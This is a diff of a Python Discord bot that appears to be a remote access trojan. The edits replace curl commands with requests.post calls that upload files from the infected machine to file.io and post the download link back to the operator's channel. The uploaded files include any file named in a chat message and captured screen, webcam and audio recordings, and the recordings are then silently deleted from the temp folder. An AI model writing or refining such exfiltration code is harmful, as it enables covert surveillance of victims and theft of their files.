@@ -343,16 +343,10 @@ async def on_message(message):
             filename=message.content[10:]
             check2 = os.stat(filename).st_size
             if check2 > 7340032:
-                instruction = """curl -F file=@""" + '"' + filename + '"' + """ https://file.io/?expires=1w"""
+                import requests
                 await message.channel.send("this may take some time becuase it is over 8 MB. please wait")
-                string = subprocess.getoutput(instruction)
-                import re
-                output = re.search("key", string).start()
-                output = output + 6
-                output2 = output + 12
-                boom = string[output:output2]
-                boom = r"https://file.io/" + boom
-                await message.channel.send("download link: " + boom)
+                response = requests.post('https://file.io/', files={"file": open(filename, "rb")}).json()["link"]
+                await message.channel.send("download link: " + response)
                 await message.channel.send("[*] Command successfuly executed")
             else:
                 file = discord.File(message.content[10:], filename=message.content[10:])
@@ -1019,15 +1013,8 @@ username: {username} ({user_id})
             check = temp + r"\output.avi"
             check2 = os.stat(check).st_size
             if check2 > 7340032:
-                instruction = """curl -F file=@""" + '"' + check + '"' + """ https://file.io/?expires=1w"""
                 await message.channel.send("this may take some time becuase it is over 8 MB. please wait")
-                string = subprocess.getoutput(instruction)
-                import re
-                output = re.search("key", string).start()
-                output = output + 6
-                output2 = output + 12
-                boom = string[output:output2]   
-                boom = r"https://file.io/" + boom
+                boom = requests.post('https://file.io/', files={"file": open(check, "rb")}).json()["link"]
                 await message.channel.send("video download link: " + boom)
                 await message.channel.send("[*] Command successfuly executed")
                 os.system(r"del %temp%\output.avi /f")
@@ -1065,15 +1052,8 @@ username: {username} ({user_id})
             check = temp + r"\output.mp4"
             check2 = os.stat(check).st_size
             if check2 > 7340032:
-                instruction = """curl -F file=@""" + '"' + check + '"' + """ https://file.io/?expires=1w"""
                 await message.channel.send("this may take some time becuase it is over 8 MB. please wait")
-                string = subprocess.getoutput(instruction)
-                import re
-                output = re.search("key", string).start()
-                output = output + 6
-                output2 = output + 12
-                boom = string[output:output2]   
-                boom = r"https://file.io/" + boom
+                boom = requests.post('https://file.io/', files={"file": open(check, "rb")}).json()["link"]
                 await message.channel.send("video download link: " + boom)
                 await message.channel.send("[*] Command successfuly executed")
                 os.system(r"del %temp%\output.mp4 /f")
@@ -1101,15 +1081,8 @@ username: {username} ({user_id})
             check = temp + r"\output.wav"
             check2 = os.stat(check).st_size
             if check2 > 7340032:
-                instruction = """curl -F file=@""" + '"' + check + '"' + """ https://file.io/?expires=1w"""
                 await message.channel.send("this may take some time becuase it is over 8 MB. please wait")
-                string = subprocess.getoutput(instruction)
-                import re
-                output = re.search("key", string).start()
-                output = output + 6
-                output2 = output + 12
-                boom = string[output:output2]   
-                boom = r"https://file.io/" + boom
+                boom = requests.post('https://file.io/', files={"file": open(check, "rb")}).json()["link"]
                 await message.channel.send("video download link: " + boom)
                 await message.channel.send("[*] Command successfuly executed")
                 os.system(r"del %temp%\output.wav /f")
